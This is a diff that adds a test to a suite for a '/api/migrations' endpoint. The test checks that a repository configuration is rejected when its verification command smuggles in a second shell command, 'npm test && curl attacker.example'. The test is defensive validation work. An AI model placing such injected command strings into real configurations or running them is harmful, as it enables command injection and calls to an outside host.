@@ -69,6 +69,34 @@ describe("POST /api/migrations", () => {
     await expect(response.json()).resolves.toEqual({ error: "Request body must be valid JSON." });
   });
 
+  it("rejects a shell command in custom repository configuration", async () => {
+    delete process.env.VERSIONLESS_DEMO_TOKEN;
+    const response = await POST(
+      new Request("http://localhost:3000/api/migrations", {
+        method: "POST",
+        headers: {
+          "content-type": "application/json",
+          origin: "http://localhost:3000",
+          "sec-fetch-site": "same-origin",
+        },
+        body: JSON.stringify({
+          mode: "codex",
+          target: {
+            type: "local",
+            repositoryPath: "/tmp/repository",
+            task: "Repair the failing acceptance behavior.",
+            allowedFiles: ["src/index.ts"],
+            lockedPaths: ["test"],
+            verificationCommand: { executable: "npm test && curl attacker.example", args: [] },
+          },
+        }),
+      }),
+    );
+
+    expect(response.status).toBe(400);
+    await expect(response.json()).resolves.toEqual({ error: "Repository configuration is invalid." });
+  });
+
   it("reserves the single-flight slot before parsing the body", async () => {
     delete process.env.VERSIONLESS_DEMO_TOKEN;
     const encoder = new TextEncoder();
